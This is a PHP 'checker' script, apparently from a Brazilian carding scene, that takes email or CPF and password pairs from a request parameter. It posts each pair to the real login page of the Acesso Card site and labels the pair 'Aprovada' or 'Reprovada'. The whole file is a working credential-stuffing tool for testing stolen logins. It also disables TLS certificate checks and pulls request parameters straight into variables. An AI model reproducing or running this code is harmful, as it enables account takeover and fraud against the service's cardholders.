<?php

error_reporting(0);
set_time_limit(0);
DeletarCookies();

extract($_GET);

function deletarCookies() {
    if (file_exists("cookie.txt")) {
        unlink("cookie.txt");
    }
}

function multiexplode ($delimiters,$string) {

    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return  $launch;
}


list($email, $senha) = multiexplode(array(";","|",":"," » "," "),$linhas);

function dados($string, $start, $end){ 
    $str = explode($start, $string); 
    $str = explode($end, $str[1]); 
    return $str[0]; 
} //funcao para puxar os dados



        $ch = curl_init();  //iniciar o cURL
        curl_setopt($ch, CURLOPT_URL, "https://www.acessocard.com.br/MinhaConta/");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/teste.txt');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: www.acessocard.com.br',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language: pt-BR,pt;q=0.5',
        'Content-Type: application/x-www-form-urlencoded',
        'Upgrade-Insecure-Requests: 1',
        'Origin: https://www.acessocard.com.br/',
        'Connection: keep-alive',
    ));
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'returnUrl=&Cpf='.$email.'&Conta=login&Senha='.$senha.'');   
        $result = curl_exec($ch);


        if (strpos($result, 'Sair') !== false) {

         echo"<br><span style='background: linear-gradient(to right, rgb(244, 238, 66) 0%, rgb(220, 244, 66)0%, rgb(66, 244, 235) 100%);
; color: black; padding: 4px 5px; border-radius: 2px; font-size: 10px; font-weight: 600;'>Aprovada</span><span style='color:white'>  EMAIL: $email  SENHA: $senha </span><span class='label label-info' style='color: white'> Informações [ NOME: $nome ]</span> <span style='background: linear-gradient(to right, rgb(244, 238, 66) 0%, rgb(220, 244, 66)0%, rgb(66, 244, 235) 100%);, whiteolor: white; padding: 4px 5px; border-radius: 2px; font-size: 10px; font-weight: 600;'>#Central_Black</span>";
           

        }else{
            echo "<span style ='background-color:red; color: black; padding: 4px 5px; border-radius: 2px; font-size: 10px; font-weight: 600'>Reprovada</span> <span style='color:red;'> EMAIL: $email SENHA:$senha  Retorno: Email ou senha incorreto</span>";
            xflush();

        }

             if (file_exists(getcwd().'/teste.txt')) {
            unlink(getcwd().'/teste.txt');
        }
?>